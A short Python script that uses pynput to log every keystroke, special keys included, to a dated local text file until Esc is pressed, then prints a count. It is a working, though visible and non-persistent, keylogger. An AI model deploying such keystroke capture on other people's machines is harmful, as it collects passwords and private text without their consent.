from pynput import keyboard
import logging
import os
from datetime import datetime

def get_log_filename():
    today = datetime.now().strftime("%Y-%m-%d")
    return f"keylog_{today}.txt"

log_file = get_log_filename()
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

key_press_count = 0

def on_press(key):
    global key_press_count
    try:
        logging.info(f'Key pressed: {key.char}')
        key_press_count += 1
    except AttributeError:
        logging.info(f'Special key pressed: {key}')
        key_press_count += 1

def on_release(key):
    if key == keyboard.Key.esc:
        print(f"Total key presses: {key_press_count}")
        return False

log_dir = os.path.dirname(log_file)
if not os.path.exists(log_dir) and log_dir:
    os.makedirs(log_dir)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
